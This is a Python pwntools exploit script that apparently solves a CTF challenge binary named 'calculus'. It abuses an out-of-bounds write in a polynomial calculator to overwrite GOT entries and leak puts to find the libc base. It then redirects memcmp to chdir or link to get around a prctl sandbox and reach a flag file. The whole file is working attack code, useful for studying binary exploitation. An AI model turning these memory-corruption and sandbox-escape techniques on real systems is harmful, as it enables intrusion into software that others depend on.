#!/usr/bin/python

from pwn import *

DEBUG = True

stdout_addr = 0x6020e0
stderr_addr = 0x602100

setbuf_got = 0x602030
prctl_got = 0x602070
atoi_got = 0x602078
puts_got = 0x602020
strncpy_got = 0x602018
exit_got = 0x602080
memcmp_got = 0x602058

val_buf = 0x602120

printf_plt = 0x4008f0
main_start = 0x401539
after_sandbox = 0x400c01
p7ret = 0x401746

#p = process('./calculus')

p = remote('localhost', 4925)

puts_offset = 0x6f690
chmod_offset = 0xf6300
chdir_offset = 0xf6eb0
link_offset = 0xf7d80

'''
con = ssh(host='plusctf.qwaz.io', user='guest', password='guest', port=22)
#p = con.remote("localhost", 10034)
p = con.remote("localhost", 4924)

puts_offset = 0x6fd60
chmod_offset = 0xeb380
chdir_offset = 0xebfb0
link_offset = 0xece00
'''

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def set_poly(poly):
  r('>> ')
  p.sendline('0')

  r('polynomial : ')
  p.sendline(poly)

def calc(val):
  r('>> ')
  p.sendline('4')

  r('of x : ')
  p.sendline(str(val))

def unset_poly():
  r('>> ')
  p.sendline('5')
 
def exit_():
  r('>> ')
  p.sendline('6')

# Overwrite stderr
fake_value_cnt = (stderr_addr - val_buf) / 4
set_poly('%dx^100+1x^0' % fake_value_cnt)
unset_poly()

set_poly('%dx^0-%dx^1' % (puts_got, puts_got))
calc(0)
calc(1)
unset_poly()

# Overwrite setbuf_got
fake_value_cnt = (setbuf_got - val_buf) / 4
set_poly('%dx^100+1x^0' % fake_value_cnt)
unset_poly()

set_poly('%dx^0-%dx^1' % (printf_plt, printf_plt))
calc(0)
calc(1)
unset_poly()

# Overwrite prctl_got
fake_value_cnt = (prctl_got - val_buf) / 4
set_poly('%dx^100+1x^0' % fake_value_cnt)
unset_poly()

set_poly('%dx^0-%dx^1' % (after_sandbox, after_sandbox))
calc(0)
calc(1)
unset_poly()

# Overwrite exit_got
fake_value_cnt = (exit_got - val_buf) / 4
set_poly('%dx^100+1x^0' % fake_value_cnt)
unset_poly()

set_poly('%dx^0-%dx^1' % (main_start, main_start))
calc(0)
calc(1)
unset_poly()

exit_()

puts_leak = r("\x7f")[4:]
puts_addr = u64(puts_leak.ljust(8, '\0'))
libc_base = puts_addr - puts_offset
chmod_addr = libc_base + chmod_offset
chdir_addr = libc_base + chdir_offset
link_addr = libc_base + link_offset

print 'puts addr: 0x%x' % puts_addr
print 'libc base: 0x%x' % libc_base

# Set chdir
log.info('Set chdir')

set_poly('-1x^100+1x^0')
unset_poly()

set_poly('%dx^0-%dx^1' % (0x706d742f, 0x706d742f))
calc(1)
calc(0)
unset_poly()

set_poly('%dx^0' % 0x612f)
calc(0)
unset_poly()

fake_value_cnt = (memcmp_got - val_buf) / 4
set_poly('%dx^100+1x^0' % fake_value_cnt)
unset_poly()

set_poly('%dx^0' % (chdir_addr % 0x100000000))
calc(0)
unset_poly()

set_poly('%dx^0' % (chdir_addr / 0x100000000))
calc(0)
unset_poly()

# Do chdir
log.info('Do chdir')

r('>> ')
p.sendline('1337\0')

'''
# Set link
log.info ('set link')

set_poly('-1x^100+1x^0')
unset_poly()

set_poly('%dx^0-%dx^1' % (0x6d6f682f, 0x6d6f682f))
calc(1)
calc(0)
unset_poly()

set_poly('%dx^0' % 0x61632f65)
calc(0)
unset_poly()

set_poly('%dx^0' % 0x6c75636c)
calc(0)
unset_poly()

set_poly('%dx^0' % 0x662f7375)
calc(0)
unset_poly()

set_poly('%dx^0' % 0x67616c)
calc(0)
unset_poly()

fake_value_cnt = (memcmp_got - val_buf) / 4
set_poly('%dx^100+1x^0' % fake_value_cnt)
unset_poly()

set_poly('%dx^0' % (link_addr % 0x100000000))
calc(0)
unset_poly()

set_poly('%dx^0' % (link_addr / 0x100000000))
calc(0)
unset_poly()

# Do link
r('>> ')
p.sendline('1337\0')
'''

p.interactive()
p.close()
